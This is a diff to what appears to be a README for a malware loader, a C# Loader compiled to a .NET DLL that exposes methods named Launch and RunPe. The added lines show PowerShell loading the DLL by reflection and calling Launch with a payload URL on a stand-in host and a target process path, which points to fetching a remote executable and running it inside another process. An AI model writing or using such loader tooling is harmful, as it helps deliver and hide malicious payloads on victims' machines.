@@ -11,13 +11,13 @@ Executes the Loader with the required parameters (e.g., URLs or paths to payload
 
 Compilation to DLL:
 
-    The Loader.cs code will be compiled into a .NET DLL (Dynamic Link Library).
-    This allows external applications, including PowerShell, to interact with its public methods using reflection or direct invocation via the .NET framework.
+The Loader.cs code will be compiled into a .NET DLL (Dynamic Link Library).
+This allows external applications, including PowerShell, to interact with its public methods using reflection or direct invocation via the .NET framework.
 
 Exposed Methods:
 
-    Loader.cs must expose its methods, such as Launch or RunPe, as public static so they can be called from PowerShell.
-    For example:
+Loader.cs must expose its methods, such as Launch or RunPe, as public static so they can be called from PowerShell.
+For example:
 
 ```csharp
 
@@ -38,9 +38,32 @@ public static void Launch(string appurl, string path)
 ```
     
 
-Interaction via PowerShell:
+## Interaction via PowerShell:
 
-    The PowerShell script will use the [Reflection.Assembly]::LoadFrom() or Add-Type methods to load the DLL and call its methods.
+The PowerShell script will use the [Reflection.Assembly]::LoadFrom() or Add-Type methods to load the DLL and call its methods.
+
+PowerShell Script (script.ps1) Integration
+
+Here’s an example of how the PowerShell script might load and interact with the DLL:
+
+Loading the DLL:
+
+    $dllPath = "path\to\Loader.dll"
+    $assembly = [Reflection.Assembly]::LoadFrom($dllPath)
+
+Invoking the Launch Method:
+
+Use the fully qualified namespace and class name (Loader.c_Loader) to call methods:
+
+    $appUrl = "http://example.com/payload.exe"
+    $path = "C:\target\process.exe"
+
+    # Call the static method
+    [Loader.c_Loader]::Launch($appUrl, $path)
+
+Passing Parameters:
+
+Ensure parameters like appurl (URL to the payload) and path (target process) are correctly passed when invoking methods.
 
         
 
